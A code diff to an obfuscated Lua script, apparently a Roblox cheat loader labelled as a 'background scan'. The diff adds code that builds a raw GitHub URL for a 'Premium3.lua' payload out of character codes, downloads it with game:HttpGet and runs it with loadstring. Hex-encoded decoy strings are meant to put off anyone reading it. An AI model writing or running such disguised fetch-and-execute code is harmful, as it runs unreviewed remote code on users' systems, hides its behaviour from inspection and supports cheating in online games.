@@ -1,6 +1,5 @@
 -- Checkpoint 2 background scan.
 
--- Scan Start
 local _0xD1F4 = "\x59\x6F\x75\x20\x53\x68\x6F\x75\x6C\x64\x6E\x27\x74\x20\x42\x65\x20\x48\x65\x72\x65\x2E\x20\x59\x6F\x75\x20\x53\x68\x6F\x75\x6C\x64\x6E\x27\x74\x20\x42\x65\x20\x52\x65\x61\x64\x69\x6E\x67\x20\x54\x68\x69\x73\x2E"
 local _0x93D9 = string.char
 local _0x3B77 = loadstring or load
@@ -34,17 +33,21 @@ _0xA1F0[#_0xA1F0+1] = _0x93D9(0x6E)
 _0xA1F0[#_0xA1F0+1] = _0x93D9(0x74)
 _0xA1F0[#_0xA1F0+1] = _0x93D9(0x28)
 _0xA1F0[#_0xA1F0+1] = _0x93D9(0x22)
-_0xA1F0[#_0xA1F0+1] = _0x93D9(0x20)  -- space
+_0xA1F0[#_0xA1F0+1] = _0x93D9(0x20) 
 _0xA1F0[#_0xA1F0+1] = _0x93D9(0x22)
 _0xA1F0[#_0xA1F0+1] = _0x93D9(0x29)
 local _0xB1F0 = table.concat(_0xA1F0, "")
 local _0xC1F0 = _0x3B77(_0xB1F0)
 _0xC1F0()
 
-_0x7832()
--- Scan End
+local _0x1a2b3c = string.char(104, 116, 116, 112, 115, 58, 47, 47) .. string.char(114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109) .. string.char(47, 71, 108, 121, 112, 104, 65, 74, 74) .. string.char(47, 71, 108, 121, 112, 104, 72, 117, 98) .. string.char(47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110) .. string.char(47, 67, 104, 101, 99, 107, 112, 111, 105, 110, 116, 47, 80, 114, 101, 109, 105, 117, 109, 51, 46, 108, 117, 97)
+local _0x4d5e6f = game:HttpGet(_0x1a2b3c)
+local _0x789abc = loadstring
+_0x789abc(_0x4d5e6f)()
 
--- Starting
+
+_0x7832()
+
 local hook = function() 
     local test = math.random(10, 100)
     local value = math.random(0, 50) + 10
@@ -135,4 +138,3 @@ local function cheatManager()
 end
 
 cheatManager()
--- Iniitialized
